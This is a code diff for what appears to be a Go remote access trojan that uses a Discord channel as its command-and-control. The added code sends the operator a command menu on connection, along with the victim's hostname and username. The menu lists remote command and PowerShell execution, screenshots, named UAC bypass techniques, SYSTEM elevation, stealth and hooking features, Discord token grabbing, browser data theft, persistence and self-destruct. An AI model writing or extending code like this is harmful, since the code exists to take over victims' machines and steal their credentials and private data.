@@ -70,9 +70,50 @@ func (c *Client) onReady(s *discordgo.Session, r *discordgo.Ready) {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USERNAME")
 
+	helpMsg := c.buildHelpMessage()
+	c.sendMessage(helpMsg)
+
 	msg := fmt.Sprintf("🟢 **Session Active**\n```\nHost: %s\nUser: %s\nReady for commands\n```",
 		hostname, username)
 	c.sendMessage(msg)
+}
+
+func (c *Client) buildHelpMessage() string {
+	return `🤖 **Available Commands:**
+
+**System:**
+• !cmd <command> - Execute Windows command
+• !shell <command> - Execute PowerShell command
+• !screen - Take screenshot
+• !privs, !whoami - Check current privileges
+
+**Privilege Escalation:**
+• !admin [method] - Bypass UAC (user → admin)
+  └─ Methods: fodhelper, eventvwr, sdclt, computerdefaults
+• !system [method] - Elevate to SYSTEM (admin → system)
+  └─ Methods: pipe, token, task
+
+**Stealth & Evasion:**
+• !hide [method] - Activate stealth features
+  └─ Methods: peb, hook, spoof, all, status
+• !stealth - Check stealth status
+
+**Data Collection:**
+• !tokens, !tokengrab - Grab Discord tokens
+• !browser, !browserdata - Steal browser data
+
+**Persistence:**
+• !persist, !persistence - Ensure persistence
+
+**Control:**
+• !exit, !kill - Self-destruct and cleanup
+
+**Examples:**
+• !admin fodhelper - Try only fodhelper UAC bypass
+• !system pipe - Try only named pipe elevation
+• !hide peb - Only activate PEB hiding
+• !hide all - Activate all stealth methods
+• !admin - Try all UAC bypass methods`
 }
 
 func (c *Client) setupChannel() error {
@@ -111,7 +152,7 @@ func (c *Client) onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	go func() {
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-		defer cancel() 
+		defer cancel()
 
 		result := c.handlers.Execute(ctx, command, args, c.session, c.channelID)
 		if result != "" {
@@ -172,3 +213,4 @@ func min(a, b int) int {
 	}
 	return b
 }
+
